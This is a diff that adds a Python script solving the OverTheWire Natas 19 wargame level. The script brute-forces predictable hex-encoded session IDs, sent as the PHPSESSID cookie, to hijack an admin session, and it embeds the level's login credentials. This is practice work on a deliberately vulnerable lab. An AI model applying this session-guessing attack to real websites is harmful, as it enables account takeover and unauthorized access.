@@ -1,0 +1,13 @@
+#!/usr/bin/env python
+
+import requests, codecs
+
+url = "http://natas19.natas.labs.overthewire.org/"
+auth = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
+
+for id in range(1, 641):
+  phpsessid = codecs.encode(bytes(str(id) + "-admin", "ascii"), "hex").decode("ascii")
+  response = requests.get(url, auth=auth, cookies={"PHPSESSID": phpsessid},  params=[("submit", "Login")])
+  if "regular user" not in response.text:
+    print(response.text)
+    break
